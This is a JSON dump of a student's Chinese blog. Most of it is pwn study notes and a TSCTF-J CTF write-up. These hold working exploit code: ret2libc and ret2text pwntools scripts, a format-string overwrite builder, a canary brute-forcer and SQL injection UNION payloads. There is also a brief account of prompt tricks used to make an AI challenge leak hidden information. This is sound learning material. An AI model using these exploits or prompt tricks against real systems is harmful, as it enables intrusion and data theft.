[{"title":"pwn学习记录（其五）","url":"/posts/45f7d273/","content":"\n被冬训题stack-pivot折磨的死去活来，最后真相令人哭笑不得\n\nstack-pivot背景当栈溢出的空间较小，或者开启了PIE保护，可以考虑将指针劫持到bss段进行操作\n使用条件可以控制程序执行流，或者可以控制栈顶指针（一般通过pop rsp/esp）\n原理栈迁移中的关键就是对leave,ret的利用相当于\nmov rsp，rbp\npop rbp\n\n连续两次的leave，ret可以将指针劫持到想要的地方如果构造ROP链\nfake_stack\naddr to leave_ret\nfake rbp\naddr to next gadget\n\n就可以劫持栈指针，一般劫持到bss段后的位置：注意要离bss段远一点！！！\n实践（以冬训题stack-pivot为例）","categories":["CTF"],"tags":["CTF","pwn"]},{"title":"pwn学习记录（其四）","url":"/posts/2a691734/","content":"\n从冬季培训的pwn题fmt中受益匪浅\n\n格式化字符串漏洞介绍格式化字符串的基本格式%[parameter][flags][field width][.precision][length]type其中\n\nparameter \nn$ 可以获取格式化字符串中的指定参数\n\n\nlength 输出的长度\nhh 输出一个字节\nh 输出一个双字节\n\n\ntype\ns 如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。\nc 如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。\np 打印对应变量的值\nn 不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量\n\n\n\n漏洞原理对于\nInput:printf(&quot;Color %s, Number %d, Float %4.2f&quot;,&quot;red&quot;,123456,3.14);\noutput:Color red,Number 123456,Float 3.14\n\n也就是说，在进入printf后，函数首先获取第一个参数，一个一个个读字符后会遇到两种情况\n\n当前字符不是%，直接输出\n当前字符是%，继续读取下一个字符\n如果没有字符，报错\n如果下一个字符是%，输出%\n否则根据相应的字符，获得相应的参数，输出\n\n\n\n利用所以，格式化字符串漏洞可以使程序崩溃，或者查看进程内容\n程序崩溃利用格式化字符串漏洞使程序崩溃是最简单的利用方式，只需要输入若干个%s即可，因为栈上不可能每个值都对应合法的地址，总有地址可以使程序崩溃。\n泄露内存\n泄露栈内存 可以获取栈上某个变量的值或对应地址的内存\n泄露任意地址内存 利用GOT表获得libc函数地址，进而获取libc，再获取其他libc函数地址\n\n泄露栈内存通过格式化字符串可以获取栈上变量的值如果输入AAA %p %p %p %p %p...再调用printf函数，就能依次获得栈中的每个参数，同时也可以知道输入的字符串被放在栈上的第几个参数处当然，通过%n$x就可以直接获得栈上的第n+1个参数而通过%s，则可以获得栈变量对应的字符串\n\n不过平时推荐用%p,可以不考虑位数和零截断的问题\n\n泄露任意地址内存将需要泄露函数的GOT表放入栈中，通过%n$s打印地址，就可以获取指定地址的内容但是需要注意的是，如果格式化字符串在栈上，就要确定格式化字符串的相对偏移，因为在函数调用时栈指针至少低于格式化字符串地址 8 字节或者 16 字节。可以通过上文泄露栈内存中提到的方法确定，也可以通过动态调试找到\n覆盖内存同理，通过%n可以修改栈上甚至任意地址变量的内存基本格式为f&quot;%&#123;value&#125;c%[offset]$hn&quot;.encode()+p64(addr)value中为要覆盖的内容，offset为要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数，addr为所要覆盖的地址\n覆盖栈内存通过动态调试找到偏移量在构造payload进行修改\n覆盖任意地址内存覆盖小数字对于小数字，与上文中读取类似，将地址和内容放入栈中即可要注意的是，填充字符使字节对齐\n覆盖大数字利用%hhn向地址写入单字节或用%hn向地址中写如双字节分次放入从网上获得基本构造如下\ndef fmt(prev, word, index):\nif prev &lt; word:\n    result = word - prev\n    fmtstr = &quot;%&quot; + str(result) + &quot;c&quot;\nelif prev == word:\n    result = 0\nelse:\n    result = 256 + word - prev\n    fmtstr = &quot;%&quot; + str(result) + &quot;c&quot;\nfmtstr += &quot;%&quot; + str(index) + &quot;$hhn&quot;\nreturn fmtstr\n\ndef fmt_str(offset, size, addr, target):\n    payload = &quot;&quot;\n    for i in range(4):\n        if size == 4:\n            payload += p32(addr + i)\n        else:\n            payload += p64(addr + i)\n    prev = len(payload)\n    for i in range(4):\n        payload += fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i)\n        prev = (target &gt;&gt; i * 8) &amp; 0xff\n    return payload\npayload = fmt_str(6,4,0x0804A028,0x12345678)\n\n其中每个参数的含义基本如下\n\noffset 表示要覆盖的地址最初的偏移\nsize 表示机器字长\naddr 表示将要覆盖的地址。\ntarget 表示我们要覆盖为的目的变量值。\n\ncanary绕过canary介绍栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。这个值储存在rbp-8的地方\ncanary泄露可以通过格式化字符串泄露canary信息或者首先通过覆盖Canary最后一个\\x00字节来打印出4位的Canary之后，计算好偏移，将Canary填入到相应的溢出位置，实现Ret到getshell函数中\n# leak Canary\npayload = &quot;A&quot;*offset\nio.sendline(payload)\nio.recvuntil(&quot;A&quot;*offset)\nCanary = u32(io.recv(4))-0xa\nlog.info(&quot;Canary:&quot;+hex(Canary))\n\n也可以在子进程中逐字节爆破canary    print “[+] Brute forcing stack canary “    start &#x3D; len(p)    stop &#x3D; len(p)+8    while len(p) &lt; stop:        for i in xrange(0,256):        res &#x3D; send2server(p + chr(i))\n    if res != &quot;&quot;:\n        p = p + chr(i)\n        #print &quot;\\t[+] Byte found 0x%02x&quot; % i\n        break\n\n      if i == 255:\n        print &quot;[-] Exploit failed&quot;\n        sys.exit(-1)\ncanary = p[stop:start-1:-1].encode(&quot;hex&quot;)\nprint &quot;   [+] SSP value is 0x%s&quot; % canary\n\ncanary绕过在获得canary后只需要在填充栈和缓冲区的字节间加上canary即可\n","categories":["CTF"],"tags":["CTF","pwn"]},{"title":"pwn学习记录（其三）","url":"/posts/d05aad03/","content":"ret2libic\n如果程序中没有system函数，在libc里找到system，使用输出libc其中的函数地址，从而计算基地址，来利用libc中的system(“&#x2F;bin&#x2F;sh”)\n\n实现步骤\n找到一个函数的真实地址，使程序打印并回到函数开始的地方\n根据基地址计算函数的偏移地址\n确认system函数和”&#x2F;bin&#x2F;sh”字符串在libc库中的偏移地址*计算真实地址\n劫持程序的执行流程，让程序执行system(“&#x2F;bin&#x2F;sh”)\n\n前提\n全局偏移量表(GOT)全局偏移量表（GOT）是一个在程序的数据段中的表，它存储了程序中所有需要动态链接的函数和变量的地址。当程序第一次调用一个动态链接的函数时，动态链接器会查找该函数在动态链接库中的地址，然后将这个地址存储在GOT表中的相应条目中。这样，当程序再次调用这个函数时，它就可以直接从GOT表中获取这个函数的地址，而不需要再次进行查找。\n程序链接表(PLT)程序链接表（PLT）是一个在程序的代码段中的表，它包含了一系列的跳转指令，这些指令用于跳转到GOT表中的相应条目。当程序需要调用一个动态链接的函数时，它会首先跳转到PLT表中的相应条目，然后通过这个条目跳转到GOT表中的相应条目，最后跳转到这个函数在动态链接库中的实际地址。\n延迟绑定只有动态库libc中的函数在被调用时，才会进行地址解析和重定位工作，也就是说，只有函数发生调用之后，我们才能够通过got表读取到libc中的函数。\n偏移地址libc是Linux系统下的C函数库，其中就会有system()函数、”&#x2F;bin&#x2F;sh”字符串，而libc库中存放的就是这些函数的偏移地址。\n基地址每次运行程序加载函数时，函数的基地址都会发生改变。这是一种地址随机化的保护机制，导致函数的真实地址每次运行都是不一样的。这次运行程序的基地址 &#x3D; 这次运行得到的某个函数func的真实地址  - 函数func的偏移地址\n\n实战(以TSCTF-J pop 为例)泄露libc基址  vuln &#x3D; 0x400626  pop_rdi_ret &#x3D; 0x0000000000400713  puts_got &#x3D; elf.got[‘puts’]  puts_plt &#x3D; elf.plt[‘puts’]  pl &#x3D; p64(0)*3 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)  p.sendlineafter(b’time!\\n’,pl)选择puts函数，劫持程序打印puts函数的真实地址计算libc的真实地址libc.address = u64(p.recv(6).ljust(8,b&#39;\\x00&#39;)) - 0x6f6a0\n劫持程序运行system(“&#x2F;bin&#x2F;sh”)  binsh &#x3D; next(libc.search(b’&#x2F;bin&#x2F;sh’))  system &#x3D; libc.sym[‘system’]  pl &#x3D; p64(0)*3 + p64(pop_rdi_ret) + p64(binsh) + p64(system)  p.sendlineafter(b’time!\\n’,pl)获取”bin&#x2F;sh”和system的真实地址，跳回vuln函数开头，执行system(“&#x2F;bin&#x2F;sh”)\n官方wpfrom pwn import *p &#x3D; remote(‘10.21.131.92’,33783)#p &#x3D; remote(‘127.0.0.1’,1337)#p &#x3D; process(‘.&#x2F;pwn’)libc &#x3D; ELF(‘.&#x2F;libc-2.23.so’)elf &#x3D; ELF(‘.&#x2F;pwn’)context(os&#x3D;’linux’,arch&#x3D;’amd64’,log_level&#x3D;’debug’)def exp():    vuln &#x3D; 0x400626    pop_rdi_ret &#x3D; 0x0000000000400713    puts_got &#x3D; elf.got[‘puts’]    puts_plt &#x3D; elf.plt[‘puts’]    pl &#x3D; p64(0)*3 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)    p.sendlineafter(b’time!\\n’,pl)    libc.address &#x3D; u64(p.recv(6).ljust(8,b’\\x00’)) - 0x6f6a0    binsh &#x3D; next(libc.search(b’&#x2F;bin&#x2F;sh’))    system &#x3D; libc.sym[‘system’]    pl &#x3D; p64(0)*3 + p64(pop_rdi_ret) + p64(binsh) + p64(system)    p.sendlineafter(b’time!\\n’,pl)    log.success(‘libc_base:’+hex(libc.address))    #gdb.attach(p)    p.interactive()if name &#x3D;&#x3D; ‘main‘:    exp()\n","categories":["CTF"],"tags":["CTF","pwn"]},{"title":"随便记点","url":"/posts/cf13ee37/","content":"不得不说，拼多多的套路更上一层楼我向来对这类东西嗤之以鼻，但如果有人找我帮忙也乐于助他一臂之力今天友人找我帮忙，我一边在心里想这个不可能完成一边复制了链接，觉得都不过无用功直到快半个小时后友人发来了提现成功的截图，八十几块的返现对于一个大学生来讲并不算少，这令我瞠目结舌也心生动摇\n万一我也成了呢？\n遂投身进入了这个深渊接下来的一个多小时里，我机械地复制，粘贴，询问友人大概还需要几个人助力，不断地将更多的朋友拉入这个深渊（致歉说是，害惨你们了）\n直到以下聊天记录发生才幡然醒悟不过是一场pdd联合我幸运的友人做下的一场局，勾连这更多的人进入这个泥潭，遂及时收手\n记录着一个多小时的一无所获，和头脑发热的自己\n哥们再也不信pdd的邪了！！！\n","categories":["杂谈"],"tags":["杂谈","日记"]},{"title":"pwn学习记录（其二）","url":"/posts/d05aad03/","content":"函数传参函数调用约定_cdecl：c&#x2F;c++默认方式，参数从右入左，主调函数负责栈平衡_stdcall：windows API默认方式，参数从右向左入栈，被调函数负责栈平衡_fastcall：快速调用。参数优先从寄存器存入（ECX和EDX），剩下的参数再从右向左从栈传入。存取方式快于内存\n_cdecl:c语言调用栈\nx86\n用栈来传递函数\n使用eax存放返回值\n\n\namd64\n前六个参数依次存放于rdi，rsi，rdx，rcx，r8，r9寄存器中\n第七个以后的参数存放于栈中\n\n\n\nret2text64位传参ROP基础如果程序中没有存在代码：\nmov eax,0xb\nmov ebx,[&quot;/bin.sh&quot;]\nmov ecx,0\nmov edx,0\nint 0x80\n//即为execve(&quot;bin/sh&quot;,NULL,NULL)\n\n则需要考虑ROP(Return Oriented Programming)返回导向编程对于能控制RIP的指令有\n\nJMP\npop RIP\nret\ncall &#x3D;push rip，jmp\n\n指令集拆分对于寄存器rbp，r12，rbp对应5D，r12对应41 5D，如果返回指令时跳过41，就能将pop r12为pop rbp\nROPgadget命令ROPgadget --binary a.out和ropper -f a.out能找到可用的gadget\nret2text进阶当读取长度有限时，可参考pwn学习（一）的最后，直接跳到调用函数执行call的地方，使指令简便\n","categories":["CTF"],"tags":["CTF","pwn"]},{"title":"pwn学习记录（其一）","url":"/posts/e04c41db/","content":"函数调用过程\ncall func&#x3D;push eip,jmp\npush ebp\nmov ebp,esp\nsub esp,0x20…\nleave &#x3D; mov esp,ebp;pop ebp\nret &#x3D; pop eip\n\npush,pop指令小结push执行push ax指令时，相当于将指针减小，再将ax中的内容放入指针所指的内存单元处，指针指向新栈顶\npop执行pop ax指令时，相当于将指针所指的内容放入ax处，再将指针增大，指针指向新栈顶\n\nret2text基础其一(以TSCTF-J ret题为例)原理由于程序使用了gets，strcpy等易溢出函数，导致读取的数据溢出，覆盖栈上的返回地址和控制参数，使指针跳转到想要的func地址位置。\n常见溢出函数gets；scanf；strcpy；sprintf：memcpy；strcat……\nchecksecchecksec函数可以用来查看程序开了什么保护措施No canary found即意味可以利用栈溢出来获得shell\ncyclic通过cyclic生成指定长度的字符串，注入字符串，可以知道栈的大小如图，在注入16个字符时程序并没有报错，而注入24个字符时程序报错，说明想要使栈溢出，至少要注入24个字符或是构建脚本\nfrom pwn import *\ncontext.log_level = &#39;debug&#39;\n# 生成测试pattern\nio = process(&#39;./pwn&#39;)\npattern = cyclic(100)\nio.sendlineafter(b&#39;Just a simple sign-in!&#39;, pattern)\nio.wait()\n# 分析崩溃地址\ncore = io.corefile\nrip = core.rip\nprint(f&quot;崩溃地址: &#123;hex(rip)&#125;&quot;)\n# 计算偏移量\noffset = cyclic_find(rip &amp; 0xffffffffffff)\nprint(f&quot;精确偏移量: &#123;offset&#125;&quot;)\n\nret在ida中打开程序，注意到main函数，vuln函数，和backdoor函数，一个是主函数，另一个是可以利用的漏洞，而最后一个和打通这个程序息息相关\n不仅可以通过cyclic查看溢出需要的字节数，也可以通过ida查看计算如图vuln占据了8+10&#x3D;18个字节，而rbp本身还占8个字节，因此需要24个字节，计算结果与cyclic结果相同\n接下来找到backdoor地址来跳转（0x400676）接下来构建payload&#x3D;b’a’*24+p64(0X4006760)\nio=process(&#39;./pwn&#39;)\nio.recvuntil(&#39;Welcome to TSCTF-J2025!\\nJust a simple sign-in!\\n&#39;)\npayload=b&#39;a&#39;*24+p64(0x400676)\nio.send(payload)\nio.interactive()\n\n提交后发现无法成功这是因为还需要栈对齐（这与本地的操作系统有一定关系）详细可查看栈对齐\n在payload中加上p64(ret)输入命令ls后列出目录，说明已经获得权限\n官方wp以上是做题时的想法，接下来展示官方给出的做法\nio=process(&#39;./pwn&#39;)\nio.recvuntil(&#39;Welcome to TSCTF-J2025!\\nJust a simple sign-in!\\n&#39;)\npayload=b&#39;a&#39;*24+p64(0x40067a)\nio.send(payload)\nio.interactive()    \n\n0x40067a 所对应的汇编代码为mov edi, offset command ; &quot;/bin/sh&quot;类似于直接执行system，跳过了前面的push rbp，也就不用栈对齐,更加简洁，也可能更加不稳定(?)，但值得借鉴\n","categories":["CTF"],"tags":["CTF","pwn"]},{"title":"二分图匹配","url":"/posts/34711169/","content":"\n计导课上无聊，看了二分匹配相关的内容，遂记录\n\n二分图如果一个图的顶点可以分为两个集合，图的所有边的两个顶点分属两个集合，则该图为“二分图” (Bipartite Graph)\n二分图的最大匹配匹配：在图论中，一个“匹配”（matching）是一个边的集合，其中任意两条边都没有公共顶点一个图所有匹配中，所含匹配边数最多的匹配，称为这个图的最大匹配。二分图的应用中，求最大匹配数是最常见的，其他的很多问题都可以转化为求最大匹配数（如最小覆盖数）\nDFS实现匈牙利算法伪代码从一侧点出发，通过相连的线段到达未与其他点匹配的另一侧点，最大匹配数即为符合上述要求的点的个数通过dfs算法实现，从左侧点出发，尝试连接右侧点\nint hungary()&#123;\n    int res=0;//res初始化，用来记录匹配最大匹配数\n    memset(linker,-1,sizeof(linker));//linker[]用来记录目前右边点的连接情况\n    for(int l=0;l &lt; lN;l++)\n    &#123;\n        memset(used,0,sizeof(used));//对于该点，初始时未开始与左侧各点连接\n        if(dfs(u))res++;//通过dfs判定上述要求能否成功\n    &#125;//lN为左侧点的个数，l为正在尝试连接的点的序号\n    return res;//返回最大匹配数\n&#125;\nbool dfs(int l)&#123;\n    for(int r=0;r &lt; rN;r++)&#123;\n        if(g[l][r] &amp;&amp; !used[r])&#123;\n            used[r]=1;\n            if(linker[r]==-1 || dfs(linker[r]))&#123;\n                linker[r]=u;\n                return 1;\n            &#125;\n        &#125;\n    &#125;\n    return 0;\n    /*r为右边点序号，rN为右边点个数，g[][]记录左右两侧点的连接情况\n    对于未被尝试连接过的点，如果该点未与其他点连接则直接相连(linker[r]==-1)，将右侧点的连接对象标记为该点\n    若已有左侧点p与其相连，先将该右侧点标记为不可再连，再去考虑点p能否与其他点相连(dfs(linker[r]))\n    以此类推，最后找到一个左侧点与右侧未与其他相连的点连接，则返回真，匹配数加一，否则匹配数不变*/\n&#125;\n\n二分图匹配匈牙利算法dfs实现的优劣优点：\n\n算法的邻接矩阵适用于稠密矩阵\n算法实现简洁，易于理解学习\n\n缺点：\n\n时间复杂度O(VE)，V为顶点数，E为边数，对于二分图匹配，理论上存在更快的算法——Hopcrott-Karp算法，该算法利用BFS同时寻找多条互补相交的最短增广路，并在一次迭代中全部用于增广。时间复杂度达到O(sqrt(V)*E),但在规模不大的稀疏图中，由于常数因子较小且易于实现，仍然常用\n\n匈牙利算法的应用示例（最大匹配数及其变式）求最大匹配数广泛应用于任务分配、网络流优化、稳定婚姻问题等领域\n最小顶点覆盖求取最少的顶点，使每条线至少和其中一个顶点关联二分图最小顶点覆盖&#x3D;二分图最大匹配数(koning 定理)\n最大独立数选取最多的点，使任意所选两点均不相连最大独立数&#x3D;最大匹配数\nDAG图的最小路径覆盖对于一个 DAG（有向无环图），选取最少条路径，使得每个顶点属于且仅属于一条路径。路径长可以为 0（即单个点）最小路径覆盖数 &#x3D; 顶点数 - 最大匹配数\n总结基于DFS算法实现匈牙利算法，本质上还是穷举所有可能，如果DFS学习到位还是非常好理解的\n","categories":["算法"],"tags":["算法"]},{"title":"组合博弈入门","url":"/posts/a4f4278c/","content":"\n计导课学习记录\n\n","categories":["算法"],"tags":["算法"]},{"title":"Hello World","url":"/posts/4a17b156/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"2025 TSCTF-J WP","url":"/posts/4c9af485/","content":"AI:Coup给出前中后期策略，然后开roll策略：前期苟，中期挑软柿子打，后期有把握就开原文：Early on, prioritize safe income generation or using the Duke’s Tax for economy, while avoiding unnecessary bluffs. As funds reach 7-9, leverage Coups or Assassinations to target the weakest opponent , accelerating the game to a one-on-one scenario. Maintain resource control to avoid forced Coups at 10, and use challenges sparingly based on opponent patterns—challenge only when bluff probability is high. In late game, concentrate attacks on the remaining player, balancing aggression with survival; for instance, bluff cautiously in head-to-head situations due to higher challenge risks.\nThreeFairy Tales误打误撞，反提示操作，将执剑人temperature拉到70，将情报变成每个字藏在每句话第二个字的一段话，结果ai把输入的话又输出了，通过\n\nCrypto：Cantor’s_gift康托展开数，逐除（n-1-i）！得到打乱序列，还原字符串数字符串长度得到n&#x3D;37初始化\nfactorials=[1]*n\n    if n&gt;1:\n        temp_fact=1\n        for i in range(1,n):\n            temp_fact*=i\n            factorials[i]=temp_fact\n    avail=list(range(1,n+1))\nperm=[]\nX=cantor_num\n\n还原康托展开，还原随机排序    for i in range(n):        fact_val&#x3D;factorials[n-1-i]        index&#x3D;X&#x2F;&#x2F;fact_val        X&#x3D;X%fact_val        element&#x3D;avail.pop(index)        perm.append(element)\n排序反向，还原字符串\ninverse_perm=[0]*len(perm)\nfor pos,val in enumerate(perm):inverse_perm[val-1]=pos+1//反向\nFlag=bytearray(len(hint2))\n    for i in range(len(hint2)):\n        Flag[i]=hint2[inverse_perm[i]-1]\n\nsign_in异或回去，恢复flag base64解码将字符串转成整型\nkey1=int(KEY1,16)\nkey2_xor_key1=int(KEY2_XOR_KEY1,16)\nkey2_xor_key3=int(KEY2_XOR_KEY3,16)\nflag_xor_all=int(FLAG_XOR_ALL,16)\n\n异或回去\nKey2=key2_xor_key1^key1\nkey3=key2^key2_xor_key3\nm=flag_xor_all^key1^key2^key3\n\n转回字符串\nhex_str=hex(m)[2:]\nflag_byte=bytes.fromhex(hex_str)\nflag=base64.b64decode(flag_bytes).decode(&#39;utf-8&#39;)\n\np&#x3D;~qp，q类似取反，q+p=3*2**1023\n设：p=2^(1023)+a*2+1\nq=2^(1023)+ b*2 1   \nb=(2^1022-1)-a\n\n带入n解方程得到p，q\ns=3*(1&lt;&lt;1023)\nD=s*s-4*n\nsqrt_D=math.isqrt(D)\np=(s+sqrt_D)//2\nq=(S-sqrt_D)//2\n计算私钥，d=pow(e,-1,(p-1)(q-1))\nphi=(p-1)*(q-1)\nd=pow(e,-1,phi)\n解密m=pow(c,d,n)\nm=pow(c,d,n)\nflag=long_to_bytes(m)\n\n野狐禅Paillier加密还原计算得到y\ny_vals=[]\nfor i in range(150):\n    c_i=ciphertexts[i]\nraw_i=lcg_raws[i]\nr_i=raw_i%n\n    t_i=pow(r_i,n,n2)\n    inv_t_i=pow(t_i,-1,n2)\n    z_i=(c_i*inv_t_i)%n2\n    m_val_i=(z_i-1)//n\n    y_vals.append(m_val_i)\n\n构建线性关系求解\nb=y_vals[k:2*k]\nA =[]\n    for i in range(k):\nrow=[]\n        for j in range(k):\nindex=k+i-1-j\n        row.append(y_vals[index])\n    A.append(row)\nA_matrix=Matrix(A)\nb_vector=Matrix(b）\nc_vector=A_matrix.solve(b_vector)\ncoeffs=[int(c)for c in c_vector]\n\n还原flag\nn_flag=sum(coeffs[j]*(3**j)for j in range(k))\nflag_bytes = long_to_bytes(n_flag)\n\n\nmiscBadFile打开txt和wav分析需要找出的文件需要找出个人信息，pdf则在010中分析，发现加入了类似网站源码的编码，Txt和wav硬翻，pdf取了内存最大的五个\nMeow根据010打开得到的提示调整解码方式，a-zA-Z0-+&#x2F;&#x3D;，根据绿色深浅调整字符串排序在Cyberchef中解码得到\n卢森堡的秘密卢森堡的首字母就是lsb，简单Lsb隐写\n\nPwnRet打开ida找到&#x2F;bin&#x2F;sh地址0x400794backdoor函数地址：0x400676找到vul函数，得到需要填充缓冲区16+rbp 8字节根据提示找到ret地址0x4006b6，栈对齐提交payload2 &#x3D;b’A’*offset+p64(ret)+p64(backdoor)填充缓冲区+栈平衡+backdoor地址\n\nWebDruid根据提示&#x2F;Druid随便试账号和密码，admin admin过了\nEZ_login根据提示加X-Forward伪造本地管理员然后burpsuit爆破得到密码simple\nEZ_SQL查询返回几列数据 1’ ORDER BY 3 – 成功 4 失败联合查询1’ UNION SELECT 1,2,3 –CONVERT把第一个flag变成 flag USING utf81’ UNION SELECT 1,CONVERT(flag USING utf8), 3 FROM flag – \n","categories":["wp"],"tags":["CTF","wp"]}]